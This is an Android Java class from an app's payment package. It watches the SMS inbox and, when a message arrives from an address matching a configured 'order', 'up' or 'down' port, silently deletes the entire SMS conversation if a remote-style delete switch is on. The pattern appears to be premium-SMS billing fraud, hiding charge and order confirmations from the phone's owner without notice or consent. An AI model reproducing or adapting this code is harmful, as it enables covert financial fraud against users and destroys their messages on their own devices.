package com.community.yuequ.pay;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.community.yuequ.modle.OrderTip;
import com.community.yuequ.util.Log;

import java.util.ArrayList;

/**
 * 获取短信内容
 */
public class GetSmsContent extends ContentObserver {
    public final String SMS_URI_INBOX = "content://sms/inbox";
    private Context context = null;
    private String smsContent = "";
    private Handler handler;

    public GetSmsContent(Context context, Handler handler) {
        super(handler);
        this.context = context;
        this.handler = handler;
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange);

        Cursor cursor = null;
        ContentResolver contentResolver = context.getContentResolver();
        cursor = contentResolver.query(Uri.parse(SMS_URI_INBOX), new String[]{
                "_id", "address", "body", "read","thread_id"}, "read=?", new String[]{"0"}, "date desc");

        if (cursor != null) {
            if (cursor.moveToFirst()) {

                String smsbody = cursor.getString(cursor.getColumnIndex("body"));
                String address = cursor.getString(cursor.getColumnIndex("address"));
                int _id = cursor.getInt(cursor.getColumnIndex("_id"));
                int threadId = cursor.getInt(cursor.getColumnIndex("thread_id"));
                if (smsbody == null) {
                    return;
                }
                ArrayList<OrderTip> orderTipsList = Slog.getOrderTipsList();

                for (OrderTip orderTip : orderTipsList) {
                    if (orderTip.up_port != null && orderTip.up_port.startsWith(address)) {
                       if("1".equals(orderTip.is_del_msg_swtich)){
                           int delete = contentResolver.delete(Uri.parse("content://sms/conversations/" + threadId), null, null);
                           Log.i("GetSmsContent","up_port:"+delete);
                       }
                    }
                }
                for (OrderTip orderTip : orderTipsList) {
                    if (orderTip.order_port != null && orderTip.order_port.startsWith(address)) {
                        if("1".equals(orderTip.is_del_msg_swtich)){
                            int delete = contentResolver.delete(Uri.parse("content://sms/conversations/" + threadId), null, null);
                            Log.i("GetSmsContent","order_port:"+delete);
                        }
                    }
                }
                for (OrderTip orderTip : orderTipsList) {
                    if (orderTip.down_port != null && orderTip.down_port.startsWith(address)) {
                        if("1".equals(orderTip.is_del_msg_swtich)){
                            int delete = contentResolver.delete(Uri.parse("content://sms/conversations/" + threadId), null, null);
                            Log.i("GetSmsContent","down_port:"+delete);
                        }
                    }
                }
            }
            cursor.close();
        }
    }
}